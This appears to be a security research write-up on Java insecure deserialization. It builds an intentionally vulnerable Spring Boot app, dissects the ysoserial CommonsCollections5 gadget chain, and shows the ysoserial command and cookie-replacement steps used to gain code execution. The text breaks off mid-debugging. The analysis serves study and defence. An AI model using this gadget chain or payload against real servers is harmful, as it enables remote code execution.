<div align="center">

# Java Insecure Deserialization Report

</div>

# **1. Introduction**

In Java, `serialization` is the process of converting an object into a byte stream for storage or transmission, while `deserialization` is the process of reconstructing an object from that byte stream. This mechanism efficiently supports data exchange between systems or object state preservation. However, when not implemented securely, it can lead to an `insecure deserialization` vulnerability, creating opportunities for attackers to exploit the system.

This report will describe in detail:

- The causes of `insecure deserialization`.

- Building a Java application containing a deserialization vulnerability.

- Presenting the exploitation process using `ysoserial` and analyzing the `gadget-chain` leading to RCE.

- Detailed debugging steps of the execution flow in the `gadget-chain`.

- Proposed preventive measures to protect systems against `deserialization` attacks.

---

# **2. What is Deserialization Vulnerability in Java?**

`Insecure deserialization` occurs when a Java application deserializes untrusted input data (typically user-provided) without proper validation or control mechanisms. This allows attackers to manipulate serialized objects, inject malicious data into the application code, or even replace the original object with an object of a completely different class. Notably, during deserialization, any class available in the application's classpath can be decoded and instantiated, regardless of whether that class is expected or not. Therefore, this vulnerability is sometimes called `object injection`.

## **2.1 Impact of Deserialization Vulnerability**

The `insecure deserialization` vulnerability can have serious consequences by expanding the application's attack surface. It allows attackers to exploit existing code in dangerous ways, leading to various types of vulnerabilities, most commonly remote code execution (RCE).

Even when RCE is not feasible, this vulnerability can still be exploited to perform privilege escalation, unauthorized file access, or denial of service (DoS) attacks.

## **2.2 Examples of Deserialization Errors in Java**

A typical example is the use of unsafe objects like **`ObjectInputStream.readObject()`** without checking the type of object being sent. When an unvalidated object is deserialized, an attacker can change the object's class type and inject executable code.

```java
ObjectInputStream ois = new ObjectInputStream(inputStream);
MyObject obj = (MyObject) ois.readObject();  // This is where the error occurs if input data isn't validated.
```

# **3. Building the Vulnerable Application**

## **3.1. General Information About the Application**

- **Application Name:** Java Insecure Deserialization
- **Purpose:**  
  The application is built to understand and analyze the _insecure deserialization_ vulnerability in Java, as well as analyze the gadget-chain created by the _ysoserial_ tool.

- **Environment & Technologies Used:**
  - **Language:** Java (version 8)
  - **Project management:** Apache Maven
  - **Framework:** Spring Boot 2.7.18
  - **Server:** Embedded Tomcat (integrated in Spring Boot)
  - **Related technology:** Servlet (used to interact with cookies)
  - **Environment:** Local

---

## **3.2. Details About the Affected Endpoint and Operational Flow**

The application is built as a simple registration and login website, with 4 main endpoints as follows:

1. **/register:**

   - **Function:** Allows users to register an account.
   - **Processing:** Registration data is stored in a _HashMap_ (not using a database, just temporary).

2. **/login:**

   - **Function:** Allows users to log in.
   - **Processing:**
     - After successful login, the website creates a cookie named **user_session**.
     - The cookie value is the username that is _serialized_ and then _base64_ encoded.

3. **/home:**

   - **Function:** Home page displays the content "Hello [username]".
   - **Processing:**
     - Checks for the existence of the _user_session_ cookie.
     - If there's no cookie, returns Forbidden.
     - If present, the cookie is base64 decoded, then deserialized to extract the username. If the cookie deserializes to a valid value, it displays "Hello [username]", otherwise it displays "Invalid Cookie".

4. **/logout:**
   - **Function:** Deletes the cookie and redirects the user to the login page.

---

## **3.3. Code Causing the Vulnerability**

The application uses `Apache Commons Collections 3.1`, an old library containing known vulnerabilities, with gadget-chains that have been researched and exploited. Using the **ysoserial** tool with options _CommonsCollections5_, _CommonsCollections6_ or _CommonsCollections7_ will help create payloads to exploit this vulnerability. **In this report, we will analyze the gadget-chain of _CommonsCollections5_**.

At the `/login` and `/home` endpoints, the cookie processing is affected by deserialization without adequate security checks. The cookie processing code is shown below:

![serial_deserial.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fserial_deserial.png?alt=media&token=163e9048-5587-4b62-aab6-f53e8f1b6c38)

<div align="center">

_Serialize and Deserialize methods with base64 encoding_

</div>
<br><br>

![login_home.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Flogin_home.png?alt=media&token=84f6e3e5-850a-45c3-8fbd-b93365a2ba9c)

<div align="center">

_/login and /home endpoints_

</div>

Upon successful login, a cookie named _user_session_ is created with the value being the _username_ processed through the _serializeToBase64_ method. The /home endpoint then processes this cookie value; if present, it goes through the _deserialFromBase64_ method without validation or blacklisting of valid classes when performing _readObject()_, allowing hackers to inject payloads through the cookie value.

## **3.4. Supporting Information**

#### Using ysoserial

- Use the **ysoserial** tool with **CommonsCollection5 (6, 7)** option to create malicious payloads. Note that JDK8 is required to create the payload.
- The created payload is then _base64_ encoded and used to replace the **user_session** cookie value after successful login.

#### Exploit

- Even though the interface displays an _"invalid cookie"_ message, the backend still proceeds with **deserializing** the cookie and successfully executes the gadget-chain.
- The debugging process (setting breakpoints in the IDE) helps observe the execution flow:
  1. **Deserialize value from cookie**
  2. **Load and execute the gadget chain** (calling `Runtime.getRuntime().exec()`)

---

# **4. Analysis of CommonsCollections5 Gadget-chain**

## **4.1. What is a Gadget-chain?**

In the context of **Insecure Deserialization**, a **gadget-chain** is a sequence of objects linked together in a specific way. Each object in this chain contains a "gadget," which is a small piece of code capable of performing a specific action. An attacker creates a chain of serialized gadgets, and when the application deserializes this chain, the gadgets are executed in a specific order, leading to the execution of a dangerous action, such as RCE.

## **4.2. Detailed Analysis**

![gadget_chain.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fgadget_chain.png?alt=media&token=f4a219d6-f01d-45d1-bf4b-7db525807d8a)

<div align="center">

_CommonsCollections5 Gadget-Chain_

</div>
<br></br>

![code_gen_payload.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fcode_gen_payload.png?alt=media&token=25789ef1-8209-4a90-a32a-c38142ef3de9)

<div align="center">

_Code that generates the payload_

</div>

---

### #1 Command Input

![command.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fcommand.png?alt=media&token=d216d921-830e-4d83-874b-2a752379e783)

The `execArgs` object is created with the String type with the value being the `command` provided by the user, depending on the command the payload creator wants to execute.

![debug command](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_command.png?alt=media&token=f4880a29-8201-4df5-9403-77c810fa2e17)

---

### #2 Initializing the Transformer

![fake_transform.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Ffake_transform.png?alt=media&token=114faff9-b71f-4277-b987-a5b256864009)
`Transformer` is an interface with the method `transform(Object input)`, which takes an input value and returns a different value. Here the `transformerChain` object is initialized as a `ChainedTransformer` which is a subclass of Transformer, containing a `ConstantTransformer(1)`. `ChainedTransformer` is a special Transformer that takes a list of `Transformer[]` and calls each Transformer sequentially.

Initially, we only initialize `ConstantTransformer(1)` because it only returns 1, making it harmless and avoiding premature payload execution. We'll replace it with the actual payload later.

![debug_fake_chain.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_fake_chain.png?alt=media&token=5c06997f-07e4-4c91-9f87-0c3577236bee)

---

### #3 The Real Transformer Chain

![real_transformer.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Freal_transformer.png?alt=media&token=dc0fc329-ecc9-47b6-945c-5de99ab23f49)
The `transformers` object is initialized as an array of Transformer[] with 5 component Transformers, in sequence:

```java
new ConstantTransformer(Runtime.class)
```

`ConstantTransformer` is a Transformer that returns a specific value, in this case it returns `Runtime.class`

![debug_runtimeclass.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_runtimeclass.png?alt=media&token=33d91dbe-4730-4234-9937-60f209eddd72)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new InvokerTransformer("getMethod", new Class[] {
            String.class, Class[].class },
            new Object[] {
                "getRuntime", new Class[0] })
```

Next, `InvokerTransformer` will get the `getRuntime()` method of the `Runtime` class. The structure of `InvokerTransformer` is:

```java
new InvokerTransformer(methodName, paramTypes, args)
```

`methodName`: The name of the method to call.

`paramTypes`: List of parameter data types.

`args`: List of argument values.

- **`methodName`**:

In the payload creation code, `methodName` is `"getMethod"`, which is a method of the `Class` class used to call a method on an object.

<br>

- **`paramTypes`**:

This is the list of data types of parameters that the `"getMethod"` method requires. The `getMethod()` method is defined in Java as:

```java
Method getMethod(String name, Class<?>... parameterTypes)
```

`String name`: The name of the method to find ("getRuntime").

`Class<?>... parameterTypes`: List of parameter data types of the method to find.

In the code, `paramTypes` is:

```java
new Class[] { String.class, Class[].class }
```

`String.class`: Data type of the first parameter ("getRuntime" - method name).

`Class[].class`: Data type of the second parameter (new Class[0] - list of parameters of that method).

<br>

- **`args`**:

```java
new Object[] { "getRuntime", new Class[0] }
```

`"getRuntime"`: String name of the method to find in `Runtime.class`.

`new Class[0]`: List of parameters of the `getRuntime()` method, which has no parameters, so an empty array (`new Class[0]`) is passed.

After running through this `InvokerTransformer`, it returns `Runtime.getRuntime()` to prepare to call the `exec` method.

![debug_getruntime.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_getruntime.png?alt=media&token=87713c5b-b1dd-4438-a3c4-e72b100b985e)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new InvokerTransformer("invoke", new Class[] {
            Object.class, Object[].class },
            new Object[] {
                null, new Object[0] })
```

The function and structure are still the same as the `InvokerTransformer` above. This time, it has the task of executing `Runtime.getRuntime()` to get the `Runtime` object.

![debug_invoke.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_invoke.png?alt=media&token=687dcbcb-4693-45db-bb85-3a42ff923399)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new InvokerTransformer("exec", new Class[] { String.class }, execArgs)
```

With the final `InvokerTransformer`, it calls the `exec()` method of the `Runtime` object (`Runtime().getRuntime().exec(command)` or `Runtime().exec(command)`) to execute the provided command.

![debug_exec.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_exec.png?alt=media&token=0a831a52-2421-4590-9c50-f02002cb95b9)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
new ConstantTransformer(1)
```

The final _ConstantTransformer_ returns **1** to finish and avoid errors.

![debug_endconst.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_endconst.png?alt=media&token=157a3809-6010-4691-9f83-ebe7af7f707f)

---

### #4. Creating LazyMap and TiedMapEntry

![lazymap_tiedmap.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Flazymap_tiedmap.png?alt=media&token=4d5ee913-d543-4fcd-9d4a-89928af7072f)

```java
final Map innerMap = new HashMap();
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
```

In the _Apache Commons Collections_ library, `LazyMap` is a class that acts like a regular `Map` but can automatically generate values when a key doesn't exist. When accessing a key that doesn't exist in `LazyMap`, it will call the `Transformer` to create a new value.

The `innerMap` object is a regular `HashMap`, initially empty and without any special mechanisms. The `LazyMap.decorate(innerMap, transformerChain)` method wraps `innerMap` into a `LazyMap`. The resulting `lazyMap` object is a LazyMap where:

- The actual data is still stored in `innerMap`.
- `transformerChain` acts as a factory: When a key doesn't exist in innerMap, instead of returning null, LazyMap will call `transformerChain.transform(key)` to create the corresponding value. Initially, `transformerChain` is just a fake chain, returning only `1`, but it will be replaced with the real chain later.

![debug_lazymap.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_lazymap.png?alt=media&token=ee198751-bf34-4b4d-b9ee-63810536f1cb)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
```

`TiedMapEntry` is also a class in `Apache Commons Collections`, designed to link a Map with a specific key. The `entry` object created is a `TiedMapEntry` that connects `lazyMap` with the key `"foo"`. When `entry.toString()` is called, it will call `lazyMap.get()` because the key "foo" doesn't exist yet, and `transformerChain.transform()` will be called, triggering the gadget-chain.

![debug_tiedmap.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_tiedmap.png?alt=media&token=c9e5888e-9c11-420d-9ffc-ca0b50e9537f)

---

### #5. Assigning to `BadAttributeValueExpException` for Automatic Triggering

![BadAttribute.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2FBadAttribute.png?alt=media&token=8cfc9b6e-eb52-484c-ac89-66b3131df54a)

```java
BadAttributeValueExpException val = new BadAttributeValueExpException(null);
```

`BadAttributeValueExpException` is a class in Java, used when there's an error in the value of an attribute. `val` is an object of this class. Here, when initializing the `val` object, we pass `null` because this value will be changed later to override the `toString()` method, causing the `toString()` of `TiedMapEntry` to be triggered.

![debug_val.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_val.png?alt=media&token=a575d96e-9fa0-41df-b057-4011edb1fd8e)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
Field valfield = val.getClass().getDeclaredField("val");
```

The `valfield` object belongs to the `Field` class. The `getClass()` method returns a Class object representing the class of `val` (BadAttributeValueExpException). The `getDeclaredField(String fieldName)` method is a method of the `Class` class, helping to get information about a specific field in the class. It returns a Field object containing information about the "val" field, whether it's private, protected, or public.

![debug_valfield.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_valfield.png?alt=media&token=bfae9563-ad80-4417-9395-e74d1e31dad8)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
Reflections.setAccessible(valfield);
```

The `setAccessible()` method in `Reflections.java` (from ysoserial) has the task of bypassing Java's access restrictions, helping us to modify the value of a private field. The source code of the `setAccessible` method in `Reflections.java`:

```java
public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
        if (javaVersion < 12) {
            Permit.setAccessible(member);
        } else {
            member.setAccessible(true);
        }
    }
```

The `setAccessible()` method is a wrapper that calls `setAccessible(true)` from native Java (`AccessibleObject.java`). This wrapper simplifies bypassing access restrictions across different Java versions. Meanwhile, the original `setAccessible(true)` incorporates security checks to prevent unauthorized access.

- For Java versions < 12, `setAccessible(member)` calls `Permit.setAccessible(member)` to bypass access restrictions without causing runtime warnings.
- From Java 12 onwards, `member.setAccessible(true)` is called directly. However, due to the enhanced security of the module system (JPMS), `Permit` becomes unnecessary and less effective. At this point, `setAccessible(true)` only works when not blocked by the `SecurityManager` or JPMS restrictions (such as an unopened module).

The `setAccessible()` called here helps to change the value of the private field `val`.

![debug_setAccess.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_setAccess.png?alt=media&token=11d3a972-6a1a-4115-94e9-d3d7766e51dd)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
valfield.set(val, entry);
```

The `set(Object obj, Object value)` method of the `Field` class sets the value of the `val` field in the `val` object to `entry`. `entry` was previously assigned as a `TiedMapEntry`.

![debug_setField.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_setField.png?alt=media&token=c2dba116-89d2-4ca6-8eb2-d42a08d4639a)

<div style="width: 350px; height: 0.5px; background-color: black; margin: 15px auto;"></div>

```java
Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
```

The source code of the `setFieldValue()` method in `Reflections.java`:

```java
public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
```

`setFieldValue(obj, fieldName, value)` has the main function of finding and changing the value of a private or protected field - fields that normally cannot be accessed from outside the class - in an object. In this case, it sets the value of `iTransformers` in `transformerChain` (fake chain) to `transformers` (real chain).

![debug_replace.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug_replace.png?alt=media&token=b893fbe4-75b8-4f6c-8e0f-d0b4586001e7)

### #6. Conclusion

When the payload is passed to `readObject()`, the sequence will be:

1. `val.toString()` is called

2. `entry.toString()` is called

3. `lazyMap.get("foo")` is called

4. `transformers.transform("foo")` is called

5. `ChainedTransformer` executes each step:

   - Runtime.class

   - .getMethod("getRuntime")

   - .invoke(null) → Runtime.getRuntime()

   - .exec(command) → Execute the command.

---

# **5. Creating Payloads with ysoserial**

`ysoserial` is an open-source tool that helps create payloads to exploit insecure deserialization vulnerabilities in Java applications. This tool contains many gadget-chains based on popular libraries, allowing attackers to achieve RCE if the target application doesn't have secure deserialization control mechanisms.

## **5.1. Identifying the Appropriate Gadget-chain**

Before creating a payload, it's necessary to identify the libraries present in the target application by checking the classpath, WEB-INF/lib directory, or the pom.xml file. For example, if the application uses Commons Collections 3.1, we can use gadgets like CommonsCollections5, 6, or 7.

## **5.2. Creating the Payload**

Command structure:

```sh
java -jar ysoserial-[version]-all.jar [payload] '[command]'
```

- java: JDK 8 should be used to ensure compatibility.

- payload: The type of gadget-chain suitable for the target application.

- command: The system command that will be executed when the payload is deserialized.

Using `CommonsCollections5` as an example, which was analyzed in this report, in a web application using `Apache Commons Collection 3.1` so it's valid, we would have the command:

```sh
java8 -jar ysoserial-all.jar CommonsCollections5 'sh -c $@|sh . echo open -a Calculator'
```

![payload.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fpayload.png?alt=media&token=74771989-1b97-42b9-9859-405afe6175fe)

In the web application demonstrating the deserialization vulnerability, user data is serialized then base64 encoded before being stored in a cookie, so when creating the payload, it also needs to be base64 encoded to be inserted into the cookie, as the payload will be base64 decoded then deserialized.

## **5.3. Notes on Runtime.exec()**

In the process of creating and exploiting payloads, the `Runtime.getRuntime().exec(command)` command is used to execute system commands. But if you just pass a command as you would on a normal shell to create the payload, it won't work as expected when deserialized.

In the article "sh – Or: Getting a shell environment from Runtime.exec", author Markus Wulftange discusses using the Runtime.exec method in Java on Unix systems. He points out that when using Runtime.exec, commands are not executed in an actual shell, leading to features like pipes, redirections, quoting, or expansions not working as expected.

To overcome this, the author suggests using the command `sh -c $@|sh . echo [command]` to create a full shell environment, allowing the execution of complex commands with all shell features. This method takes advantage of sh's ability to pass commands through standard input, helping to overcome the limitations of Runtime.exec.

However, when using this method, it's important to note that important spaces in the command must be properly encoded, as Java's StringTokenizer will separate the command string at any whitespace character.

Article link: https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html

Tool to help create runtime.exec payloads faster: https://ares-x.com/tools/runtime-exec/

![tool_runtime.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Ftool_runtime.png?alt=media&token=945e674f-ac02-4f24-91ab-d7974ba4b004)

---

# **6. Debugging a Website with Insecure Deserialization Leading to RCE**

In the process of debugging the demo website, we use IntelliJ IDEA to leverage convenient debugging features.

## **6.1. Determining Breakpoints**

To debug effectively, breakpoints are set at key points in the application and the `CommonsCollections5` gadget-chain to monitor the execution flow from cookie deserialization to RCE.

- **/login Endpoint**: Set a breakpoint to see the username value during login, observe it being serialized and added to the `user_session` cookie.
  ![endpoint_login.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fendpoint_login.png?alt=media&token=87283133-d931-4e16-82a1-26c24cf464ec)

- **/home Endpoint**: Breakpoint at the cookie processing step before deserialization, confirming the input data.
  ![endpoint_home.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fendpoint_home.png?alt=media&token=e18c0c31-a2e9-4444-8d73-cc84e6864e6e)

- **Deserialize cookie**: Breakpoint at the step of deserializing the user_session cookie to see the payload being passed in.
  ![deserialize.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdeserialize.png?alt=media&token=06823c60-bf6f-4cdf-8430-4686c3b67259)

- `CommonsCollections5` Gadget-chain: Breakpoints in the main classes:

  - `BadAttributeValueExpException.readObject()`:
    ![badattribute2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fbadattribute2.png?alt=media&token=28bc410a-6f93-4171-b614-c77dfd88e0a7)

  - `TiedMapEntry.toString()`,`TiedMapEntry.getKey()` and `TiedMapEntry.getValue()`: Monitor LazyMap activation.
    ![TiedMapEntry_toString.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2FTiedMapEntry_toString.png?alt=media&token=1d45d85c-cb65-4a05-bded-69fc4f343c79)
    ![TiedMapEntry_getValue.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2FTiedMapEntry_getValue.png?alt=media&token=3a0d27a8-3eb0-43bb-93b8-692084efd567)

  - `LazyMap.get()`: Preparing to activate ChainedTransformer
    ![lazymap_get.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Flazymap_get.png?alt=media&token=ee3db0ed-b3a5-4a73-9e46-312a3d011d4a)
  - `ChainedTransformer.transform()`: Analyze each transformer step.
    ![ChainedTransformer.tranform()](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fchainedtransformer_transform.png?alt=media&token=42f00799-cd79-4303-922c-f6f62a9f6eb5)
  - `ConstantTransformer.transform()`:
    ![constanttransformer.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fconstanttransformer.png?alt=media&token=87eeee8a-d84a-47ae-946c-3022037dd1fe)
  - `InvokerTransformer.transform()`: View the system command being executed.
    ![invokertransformer.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Finvokertransformer.png?alt=media&token=55ac5b30-503a-45e1-95b5-583b46a9131f)

## **6.2. Detailed Debugging of the Execution Flow**

When accessing the website, the login page appears first:
![login_page.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Flogin_page.png?alt=media&token=19a0325d-cc3f-45ff-ab15-90390d127d17)
We'll register before logging in, registration page:
![register_page.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fregister_page.png?alt=media&token=df6638c8-b1f3-43f1-ac6f-f6d697999627)
When sign up is successful, the website reports "Registration Successfully":
![register_success.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fregister_success.png?alt=media&token=cfbfeba8-a3d5-40f8-a3f0-dd7a5bfc4826)
After successful login, we'll be redirected to the Home Page:
![home_page.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fhome_page.png?alt=media&token=88c11074-fc5b-4c38-9399-dd6e6c2392ab)
On the Home Page, we see a line saying "Hello test!" with `test` being the username we just registered and used to log in. In `AuthController`, the `username` when logging in will be serialized then base64 encoded and stored in a cookie named `user_session`:
![debug2_cookie.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_cookie.png?alt=media&token=09c35b65-409f-4b81-bbee-27d68b6bf04b)

After the `username` is successfully serialized, base64 encoded and added to the cookie, the `/auth/home` endpoint will be called and the process of deserializing the cookie will take place to read the username that was previously serialized and base64 encoded, then display "Hello [username]":
![debug2_deserialize_cookie.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_deserialize_cookie.png?alt=media&token=1ecfb6c7-0b4b-4903-8366-9996868bcd7e)

![debug2_deserialize_cookie2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_deserialize_cookie2.png?alt=media&token=022d8ae8-c81d-42b4-b0d7-91d69f8d3429)

We can also check the cookie in the browser:
![cookie_browser.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fcookie_browser.png?alt=media&token=ae477f36-98b4-434f-88c8-1644e57eea0c)
Now we can change the cookie value with the payload created in [section 5](#5-creating-payloads-with-ysoserial):
![cookie_payload.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fcookie_payload.png?alt=media&token=0ff49efa-d0bd-4c1d-9a82-9b7b80f59216)
When reloading, the `/home` endpoint is called again, the cookie containing the payload will go into the `deserializeFromBase64` method to decode base64 and deserialize:
![debug2_payloadintodeserialize.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_payloadintodeserialize.png?alt=media&token=6bbc566b-2880-4190-8876-d6726e1438ab)
![debug2_payloadintodeserializefunc.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_payloadintodeserializefunc.png?alt=media&token=a23ea99b-0851-4aa3-b0ff-ec052c5e0506)

When the payload goes into `.readObject()` in the `deserializeFromBase64` method, it is the object that was pre-created to execute the gadget-chain, which will override the `readObject()` method in the `BadAttributeValueExpException` class:
![debug2_readobject_badattr.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_readobject_badattr.png?alt=media&token=d2602c50-beee-4c28-8b2a-c6ccc924faf7)

The `valObj` object, taken from `gf.get("val", null)` in `readObject` of `BadAttributeValueExpException`, is the value of the `val` field from the deserialized data. With the payload from ysoserial, `valObj` is a `TiedMapEntry`, it activates `toString()` in the final branch:
![debug2_valObj_toString.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_valObj_toString.png?alt=media&token=bb7e4869-1e34-491e-8b65-2f783c6e0b0e)

And `valObj` is a `TiedMapEntry`, when `toString()` is called on `valObj`, the `toString()` method of `TiedMapEntry` will be activated:
![debug2_tiedmapentry_tostring.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_tiedmapentry_tostring.png?alt=media&token=9c7d69ce-eafb-4887-83b2-404e97b9e08a)

The `TiedMapEntry.toString()` method successively calls `getKey()` (returns "foo") and `getValue()`, `getValue()` returns `map.get(key)`, which is `map.get("foo")`:
![debug2_tiedmapentry_get.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_tiedmapentry_get.png?alt=media&token=85d42b20-d8e8-4998-9ecb-4705dd7f8f2c)

Because map is a `LazyMap`, `LazyMap.get("foo")` is activated:
![debug2_lazymap_get.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_lazymap_get.png?alt=media&token=d57e60fc-fc6f-4894-bafc-81b05d78c775)

Here, the code checks whether the key `"foo"` exists, and because the map here is an empty `HashMap`, which is the `innerMap` object mentioned above, the key doesn't exist, so it activates `factory.transform(key)` with factory being a `ChainedTransformer` (the `transformers` object in ysoserial) leading to the activation of `ChainedTransformer.transform()`:
![debug2_chainedtransformer_transform.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_transform.png?alt=media&token=7b6c864e-8dc7-42f1-818c-81683c04935f)

`iTransformers[]` in `ChainedTransformer` is an array containing `Transformer` interfaces. These objects are typically concrete classes like `ConstantTransformer` or `InvokerTransformer`, used to perform a series of transformations on the input data.

`iTransformer[]` in this gadget-chain is set for values sequentially from 0 - 4 as shown in the image above. The for loop in the `ChainedTransformer.transform()` method iterates through the `iTransformers` array, successively calling the `transform()` method of each element. The initial input value is passed to the first Transformer, then the result of each call is used as input for the next Transformer.

The Transformer chain proceeds as follows:

- `i = 0`, `object = "foo"`:

  The first Transformer is a `ConstantTransformer`, the value passed in (object) is `"foo"`.
  ![debug2_chainedtransformer_loop_0.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_0.png?alt=media&token=4361dff9-e370-4317-a340-4388acf960f2)

  The `transform` method of the `ConstantTransformer` class only receives input without processing it, just returning the `iConstant` that was set up when creating the payload.
  ![debug2_chainedtransformer_loop_0_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_0_1.png?alt=media&token=515b7c9d-44e1-4df5-a797-2fc265814696)
  When the first loop ends, `object` is `java.lang.Runtime` or `Runtime.class`.

<br>

